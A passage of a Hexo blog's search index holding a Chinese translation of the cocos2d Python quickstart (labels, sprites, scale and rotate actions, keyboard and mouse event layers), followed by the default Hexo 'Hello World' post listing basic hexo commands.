class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">label = cocos.text.Label(<span class="string">'Hello, World!'</span>,</span><br><span class="line">    font_name=<span class="string">'Times New Roman'</span>,</span><br><span class="line">    font_size=<span class="number">32</span>,</span><br><span class="line">    anchor_x=<span class="string">'center'</span>, anchor_y=<span class="string">'center'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the label in the center of the screen</span></span><br><span class="line">label.position = <span class="number">320</span>,<span class="number">240</span></span><br><span class="line">self.add( label )</span><br></pre></td></tr></table></figure><p>在例子中，我们也创造和添加一个sprite（精灵）作为子节点。在cocos2d 中，精灵是sprite 对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprite = cocos.sprite.Sprite(<span class="string">'grossini.png'</span>)</span><br></pre></td></tr></table></figure><p>接下来，我们把‘精灵’安放在屏幕的中间。sprite object 的默认位置是(0,0)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprite.position = <span class="number">320</span>,<span class="number">240</span></span><br></pre></td></tr></table></figure><p>我们通过将scale属性设置为3。这将会使我们的图像放的3倍。(默认的倍率是1)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprite.scale = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>我们可以通过设置z属性，来设置对象yue在图层z轴的位置，z值越在最前面显示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.add( sprite, z=<span class="number">1</span> )</span><br></pre></td></tr></table></figure><p>我们创建一个ScaleBy 动作，它会让对象在2s里按比例缩放。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scale = ScaleBy(<span class="number">3</span>, duration=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>现在我们告诉标签将这么做：</p><p>​    将图像在2s里放大三倍。</p><p>​    然后再在2s里缩小三倍。</p><p>​    最后反复循环动作。</p><p>我们用‘+’号来链接两个动作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label.do( Repeat( scale + Reverse( scale) ) )</span><br></pre></td></tr></table></figure><p>然后我们告诉sprie做相同的动作不过是先缩小后放大：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprite.do( Repeat( Reverse(scale) + scale ) )</span><br></pre></td></tr></table></figure><p>然后我们依然利用director初始化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cocos.director.director.init()</span><br><span class="line">hello_layer = HelloWorld ()</span><br></pre></td></tr></table></figure><p>然后我们利用<code>RotateBy</code> action 让窗口在10s内进行360旋转。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello_layer.do( RotateBy(<span class="number">360</span>, duration=<span class="number">10</span>) )</span><br></pre></td></tr></table></figure><p>最后，添加上我们的执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># A scene that contains the layer hello_layer</span></span><br><span class="line">main_scene = cocos.scene.Scene (hello_layer)</span><br><span class="line"></span><br><span class="line"><span class="comment"># And now, start the application, starting with main_scene</span></span><br><span class="line">cocos.director.director.run (main_scene)</span><br></pre></td></tr></table></figure><h3 id="样例代码-1"><a href="#样例代码-1" class="headerlink" title="样例代码"></a>样例代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cocos</span><br><span class="line"><span class="keyword">from</span> cocos.actions <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="params">(cocos.layer.ColorLayer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#设置彩色图层</span></span><br><span class="line">        super(HelloWorld ,self).__init__(<span class="number">64</span>,<span class="number">64</span>,<span class="number">224</span>,<span class="number">255</span>)</span><br><span class="line"><span class="comment">#设置文本label </span></span><br><span class="line">        label = cocos.text.Label(<span class="string">'Hello, World!'</span>,</span><br><span class="line">        font_name=<span class="string">'Times New Roman'</span>,</span><br><span class="line">        font_size=<span class="number">32</span>,</span><br><span class="line">        anchor_x=<span class="string">'center'</span>, anchor_y=<span class="string">'center'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># set the label in the center of the screen</span></span><br><span class="line">        label.position = <span class="number">320</span>,<span class="number">240</span></span><br><span class="line">        self.add( label )</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#添加图片</span></span><br><span class="line">        sprite = cocos.sprite.Sprite(<span class="string">'1.png'</span>)</span><br><span class="line">        <span class="comment">#图片位置</span></span><br><span class="line">        sprite.position = <span class="number">320</span>,<span class="number">240</span> </span><br><span class="line">        <span class="comment">#缩放，这里是原图的0.3倍，步骤里是原图3倍</span></span><br><span class="line">        sprite.scale = <span class="number">0.3</span></span><br><span class="line">        <span class="comment">#添加到图层高度为1（目前的顶层）</span></span><br><span class="line">        self.add( sprite, z=<span class="number">1</span> )</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#添加缩放动画</span></span><br><span class="line">        scale = ScaleBy(<span class="number">3</span>, duration=<span class="number">2</span>)</span><br><span class="line">        label.do( Repeat( scale + Reverse( scale) ) )</span><br><span class="line">        sprite.do( Repeat( Reverse(scale) + scale ) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#初始化</span></span><br><span class="line">    cocos.director.director.init()</span><br><span class="line">    <span class="comment">#实例化图层</span></span><br><span class="line">    hello_layer = HelloWorld ()</span><br><span class="line">    <span class="comment">#对图层添加旋转动画</span></span><br><span class="line">    hello_layer.do( RotateBy(<span class="number">360</span>, duration=<span class="number">10</span>) )</span><br><span class="line">    <span class="comment"># A scene that contains the layer hello_layer</span></span><br><span class="line">    main_scene = cocos.scene.Scene (hello_layer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># And now, start the application, starting with main_scene</span></span><br><span class="line">    cocos.director.director.run (main_scene)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="Handling-Events"><a href="#Handling-Events" class="headerlink" title="Handling Events"></a>Handling Events</h2><p>在我们之前的所有例子都是没有交互的。它们都只是展示了一些东西，但是没有对用户的输入进行回响（除了当我们按下<code>ESC</code> or 点击window上的小框框时）.Cocos 通过监听<code>director.window evenets</code>来获取输入。同时，为了方便<code>cocos.layer</code>自动化监听director.window evenets.我们在图层(layer)子类中设置<code>is_event_handler</code> 类 来成员为<code>Ture</code> 然后cocos 会检查图片事件响应。</p><p>在这一节中，我们将建立一步步地通过一个小项目来学习。这个小项目将展示那些键被按下那些鼠标的位置和点击。在运行这些项目前先阅读下面的代码来获得一个清晰的思路来思考我们如何来尝试写作代码。</p><h3 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h3><p>我们开始定义<code>KeyDisplay layer</code>class.当然，我们在<code>__init__</code>做了一些初始化，在下面的代码中展示了我们的步骤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KeyDisplay</span><span class="params">(cocos.layer.Layer)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If you want that your layer receives director.window events</span></span><br><span class="line">    <span class="comment"># you must set this variable to 'True'</span></span><br><span class="line">    is_event_handler = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        super( KeyDisplay, self ).__init__()</span><br><span class="line"></span><br><span class="line">        self.text = cocos.text.Label(<span class="string">""</span>, x=<span class="number">100</span>, y=<span class="number">280</span> )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># To keep track of which keys are pressed:</span></span><br><span class="line">        self.keys_pressed = set()</span><br><span class="line">        self.update_text()</span><br><span class="line">        self.add(self.text)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_text</span><span class="params">(self)</span>:</span></span><br><span class="line">        key_names = [pyglet.window.key.symbol_string (k) <span class="keyword">for</span> k <span class="keyword">in</span> self.keys_pressed]</span><br><span class="line">        text = <span class="string">'Keys: '</span>+<span class="string">','</span>.join (key_names)</span><br><span class="line">        <span class="comment"># Update self.text</span></span><br><span class="line">        self.text.element.text = text</span><br></pre></td></tr></table></figure><p>这是一个定义<code>key_passed</code>的集，这应该是任何时候按下的一组键。然后，这些代码依然是没有作用的。我们应该告诉图层，当我们某键被按下或释放时要更新这一个字符集。换句话说，我们需要添加一个事件句柄在图层中。添加事件句柄在图层中仅仅需要在添加一个方法，让其被某个事件被调用。这里有俩个事件可以被我们选择 <code>on_key_press</code> and <code>on_key_release</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_key_press</span> <span class="params">(self, key, modifiers)</span>:</span></span><br><span class="line">    <span class="string">"""This function is called when a key is pressed.</span></span><br><span class="line"><span class="string">    'key' is a constant indicating which key was pressed.</span></span><br><span class="line"><span class="string">    'modifiers' is a bitwise or of several constants indicating which</span></span><br><span class="line"><span class="string">        modifiers are active at the time of the press (ctrl, shift, capslock, etc.)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    self.keys_pressed.add (key)</span><br><span class="line">    self.update_text()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_key_release</span> <span class="params">(self, key, modifiers)</span>:</span></span><br><span class="line">    <span class="string">"""This function is called when a key is released.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    'key' is a constant indicating which key was pressed.</span></span><br><span class="line"><span class="string">    'modifiers' is a bitwise or of several constants indicating which</span></span><br><span class="line"><span class="string">        modifiers are active at the time of the press (ctrl, shift, capslock, etc.)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Constants are the ones from pyglet.window.key</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    self.keys_pressed.remove (key)</span><br><span class="line">    self.update_text()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_text</span><span class="params">(self)</span>:</span></span><br><span class="line">    key_names = [pyglet.window.key.symbol_string (k) <span class="keyword">for</span> k <span class="keyword">in</span> self.keys_pressed]</span><br><span class="line">    text = <span class="string">'Keys: '</span>+<span class="string">','</span>.join (key_names)</span><br><span class="line">    <span class="comment"># Update self.text</span></span><br><span class="line">    self.text.element.text = text</span><br></pre></td></tr></table></figure><p>通过这样的代码，图层现在已经能充分地工作。你看可以通过按下或松开键盘，将看到任何时候图层将会展示你操作的键。</p><h3 id="键盘事件样码"><a href="#键盘事件样码" class="headerlink" title="键盘事件样码"></a>键盘事件样码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cocos</span><br><span class="line"><span class="keyword">from</span> cocos.actions <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pyglet</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KeyDisplay</span><span class="params">(cocos.layer.Layer)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If you want that your layer receives director.window events</span></span><br><span class="line">    <span class="comment"># you must set this variable to 'True'</span></span><br><span class="line">    is_event_handler = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        super( KeyDisplay, self ).__init__()</span><br><span class="line"></span><br><span class="line">        self.text = cocos.text.Label(<span class="string">""</span>, x=<span class="number">100</span>, y=<span class="number">280</span> )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># To keep track of which keys are pressed:</span></span><br><span class="line">        self.keys_pressed = set()</span><br><span class="line">        self.update_text()</span><br><span class="line">        self.add(self.text)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_text</span><span class="params">(self)</span>:</span></span><br><span class="line">        key_names = [pyglet.window.key.symbol_string (k) <span class="keyword">for</span> k <span class="keyword">in</span> self.keys_pressed]</span><br><span class="line">        text = <span class="string">'Keys: '</span>+<span class="string">','</span>.join (key_names)</span><br><span class="line">        <span class="comment"># Update self.text</span></span><br><span class="line">        self.text.element.text = text</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_key_press</span> <span class="params">(self, key, modifiers)</span>:</span></span><br><span class="line">        <span class="string">"""This function is called when a key is pressed.</span></span><br><span class="line"><span class="string">    'key' is a constant indicating which key was pressed.</span></span><br><span class="line"><span class="string">    'modifiers' is a bitwise or of several constants indicating which</span></span><br><span class="line"><span class="string">        modifiers are active at the time of the press (ctrl, shift, capslock, etc.)</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        self.keys_pressed.add (key)</span><br><span class="line">        self.update_text()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_key_release</span> <span class="params">(self, key, modifiers)</span>:</span></span><br><span class="line">        <span class="string">"""This function is called when a key is released.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    'key' is a constant indicating which key was pressed.</span></span><br><span class="line"><span class="string">    'modifiers' is a bitwise or of several constants indicating which</span></span><br><span class="line"><span class="string">        modifiers are active at the time of the press (ctrl, shift, capslock, etc.)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Constants are the ones from pyglet.window.key</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        self.keys_pressed.remove (key)</span><br><span class="line">        self.update_text()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cocos.director.director.init()</span><br><span class="line">    hello_layer =KeyDisplay( )</span><br><span class="line">    <span class="comment">#hello_layer.do( RotateBy(360, duration=10) )</span></span><br><span class="line">    <span class="comment"># A scene that contains the layer hello_layer</span></span><br><span class="line">    main_scene = cocos.scene.Scene (hello_layer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># And now, start the application, starting with main_scene</span></span><br><span class="line">    cocos.director.director.run (main_scene)</span><br><span class="line">    cocos.director.event</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h3><p>处理鼠标输入的过程是相似的。我们可以有三个事件来供我们选择：on_mouse_press, on_mouse_motion and on_mouse_drag。接着我们就可以定义我们的图层：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MouseDisplay</span><span class="params">(cocos.layer.Layer)</span>:</span></span><br><span class="line"></span><br><span class="line">    is_event_handler = <span class="literal">True</span>     <span class="comment">#: enable director.window events</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super( MouseDisplay, self ).__init__()</span><br><span class="line"></span><br><span class="line">        self.posx = <span class="number">100</span></span><br><span class="line">        self.posy = <span class="number">240</span></span><br><span class="line">        self.text = cocos.text.Label(<span class="string">'No mouse events yet'</span>, font_size=<span class="number">18</span>, x=self.posx, y=self.posy )</span><br><span class="line">        self.add( self.text )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_text</span> <span class="params">(self, x, y)</span>:</span></span><br><span class="line">        text = <span class="string">'Mouse @ %d,%d'</span> % (x, y)</span><br><span class="line">        self.text.element.text = text</span><br><span class="line">        self.text.element.x = self.posx</span><br><span class="line">        self.text.element.y = self.posy</span><br></pre></td></tr></table></figure><p>然后我们添加事件句柄让其在我们text随着我们鼠标的移动而更新同时在我们按钮被点击时改变我们text的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_mouse_motion</span> <span class="params">(self, x, y, dx, dy)</span>:</span></span><br><span class="line">    <span class="string">"""Called when the mouse moves over the app window with no button pressed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    (x, y) are the physical coordinates of the mouse</span></span><br><span class="line"><span class="string">    (dx, dy) is the distance vector covered by the mouse pointer since the</span></span><br><span class="line"><span class="string">      last call.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self.update_text (x, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_mouse_drag</span> <span class="params">(self, x, y, dx, dy, buttons, modifiers)</span>:</span></span><br><span class="line">    <span class="string">"""Called when the mouse moves over the app window with some button(s) pressed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    (x, y) are the physical coordinates of the mouse</span></span><br><span class="line"><span class="string">    (dx, dy) is the distance vector covered by the mouse pointer since the</span></span><br><span class="line"><span class="string">      last call.</span></span><br><span class="line"><span class="string">    'buttons' is a bitwise or of pyglet.window.mouse constants LEFT, MIDDLE, RIGHT</span></span><br><span class="line"><span class="string">    'modifiers' is a bitwise or of pyglet.window.key modifier constants</span></span><br><span class="line"><span class="string">       (values like 'SHIFT', 'OPTION', 'ALT')</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self.update_text (x, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_mouse_press</span> <span class="params">(self, x, y, buttons, modifiers)</span>:</span></span><br><span class="line">    <span class="string">"""This function is called when any mouse button is pressed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    (x, y) are the physical coordinates of the mouse</span></span><br><span class="line"><span class="string">    'buttons' is a bitwise or of pyglet.window.mouse constants LEFT, MIDDLE, RIGHT</span></span><br><span class="line"><span class="string">    'modifiers' is a bitwise or of pyglet.window.key modifier constants</span></span><br><span class="line"><span class="string">       (values like 'SHIFT', 'OPTION', 'ALT')</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self.posx, self.posy = director.get_virtual_coordinates (x, y)</span><br><span class="line">    self.update_text (x,y)</span><br></pre></td></tr></table></figure><p>这有点不同的是这里调用了<code>director.get_virtual_coordinates (x, y)</code>.在解释这个之前，cocos已经有两个坐标参考系，一个是物理坐标参考系一个是虚拟坐标参考系。鼠标事件句柄（mouse event handlers）会依赖于pyglet在物理坐标参考系中获取参数。如果你在虚拟坐标系中获得参数或将物理坐标系映射在虚拟坐标系中，你可能需要借助<code>director.get_virtual_coordinates</code>来进行物理坐标系与虚拟坐标系之间的映射。假如你加载了<code>self.posx</code>,<code>self.posy</code>在<code>on_mouse_press handler</code>事件中，你可以查看查询似乎是在工作的，但是如果你改变窗口的大小，这个点击次数显示将会跑到一个错误的地方上去。</p><p>对于我们已经使用的鼠标事件而言，它们是其他有用的鼠标事件：</p><p>on_mouse_release : 在一个按钮被释放的时候被调用。</p><p>on_mouse_scroll ：在鼠标滑轮移动时候被调用。</p><p>on_mouse_leave : 在鼠标移出窗口时候被调用。</p><p>on_mouse_enter：在鼠标移进窗口时被调用。</p><p>这个演示没有更多的代码了，除了一个场景中包含了两个图层然后运行它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">director.init(resizable=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Run a scene with our event displayers:</span></span><br><span class="line">director.run( cocos.scene.Scene( KeyDisplay(), MouseDisplay() ) )</span><br></pre></td></tr></table></figure><p>在这个场景中这些需求，可以去自己实现下：</p><ul><li>改变<code>on_mouse_press</code>句柄取消虚拟坐标系映射，注意改动后窗口大小后的奇怪变化</li><li>注意屏幕上的鼠标坐标是物理坐标，所以在改变窗口大小时它们也会改变，修改演示以显示虚拟坐标。</li><li>修改代码使拖动鼠标时可以移动鼠标坐标标签</li><li>更改代码，以便键盘显示也显示每次设置的修饰符</li></ul><h2 id="Where-to-next"><a href="#Where-to-next" class="headerlink" title="Where to next?"></a>Where to next?</h2><p>本章中给出的例子应该给你足够的 开始编写简单的拱廊和point-and-click-based信息 游戏。</p><p>本编程指南的其余部分进入技术细节 关于可可的一些特性。 开始时,推荐 你浏览每一章的开始而不是试图阅读 从开始到结束整个指南。</p><p>实现2 d最优性能 你需要直接使用OpenGL应用程序。 规范化 OpenGL的引用 <a href="http://opengl.org/documentation/books/#the_opengl_programming_guide_the_official_guide_to_learning_opengl_version" target="_blank" rel="noopener">OpenGL编程指南 </a>和 <a href="http://opengl.org/documentation/books/#the_opengl_shading_language_2nd_edition" target="_blank" rel="noopener">OpenGL着色语言 </a>。</p><p>因为是cocos2d使用pyglet您还应当检查 <a href="http://pyglet.org/doc/programming_guide/" target="_blank" rel="noopener">pyglet编程指南 </a>和 <a href="http://pyglet.org/doc/api/" target="_blank" rel="noopener">pyglet API参考</a></p><p>有许多是cocos2d应用的例子 <code>样品/</code>目录的文档和源代码发行版。 保持检查 <a href="http://www.cocos2d.org/" target="_blank" rel="noopener">http://www.cocos2d.org/ </a>更多的例子和教程写的。</p><p>文献来源：<a href="http://python.cocos2d.org/doc/programming_guide/quickstart.html" target="_blank" rel="noopener">http://python.cocos2d.org/doc/programming_guide/quickstart.html</a></p>]]></content>
      
      
      <categories>
          
          <category> cocos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> translate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/01/03/hello-world/"/>
      <url>/2019/01/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
